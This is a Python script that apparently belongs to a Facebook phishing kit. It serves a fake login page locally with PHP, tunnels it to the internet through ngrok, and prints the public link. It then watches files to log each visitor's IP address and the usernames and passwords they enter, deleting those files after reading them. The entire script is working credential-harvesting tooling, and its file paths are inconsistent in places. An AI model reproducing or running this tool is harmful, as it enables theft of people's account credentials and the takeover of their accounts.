import os,time,json,requests
os.system("chmod +x Abir/ngrok*")
os.system("killall php> /dev/null 2>&1")
os.system("killall ngrok> /dev/null 2>&1 || killall ngrok> /dev/null 2>&1")
os.system("cd site/facebook/ && php -S 127.0.0.1:8080> /dev/null 2>&1 &")
#os.system("chmod +x./ngrok")
#os.system("cd $HOME/aa/Abir && chmod +x ngrok")
time.sleep(10)
os.system("./ngrok http 127.0.0.1:8080> /dev/null 2>&1 &")
os.system("./Abir/ngrok http 127.0.0.1:8080> /dev/null 2>&1 &")
time.sleep(10)
os.system("curl  http://localhost:4040/api/tunnels > tunnels.json")
with open('tunnels.json') as data_file:    
    datajson = json.load(data_file)
msg = ("Your link is: ")
for i in datajson['tunnels']:
    msg = msg + i['public_url']+ '\n'+'Your second link : '
os.system('clear')
print (msg)
while True:
	if os.path.isfile("/aasite/ip.txt")==True:
		tr=open("/aa/site/ip.txt","r")
		ip2=tr.readline()
		ip=tr.readline().strip("IP:")
		print("\n [>] A User Visited the Site From IP : "+ip)
		tr.close()
		os.system("rm -rf  /site/ip.txt")
	if os.path.isfile("/aa/site/facebook/usernames.txt")==True:
	 #time.sleep(0.75)
		tr2=open("/aa/site/facebook/usernames.txt","r")
		log2=tr2.readline()
		start=int(log2.find("Username:"))
		end=int(log2.find("Pass:"))
		print("\t  user : "+log2[start+9:end])
		print("\t  Pas  : "+log2[end+5:])
		tr2.close()
		os.system("rm -rf  /aa/site/facebook/usernames.txt")
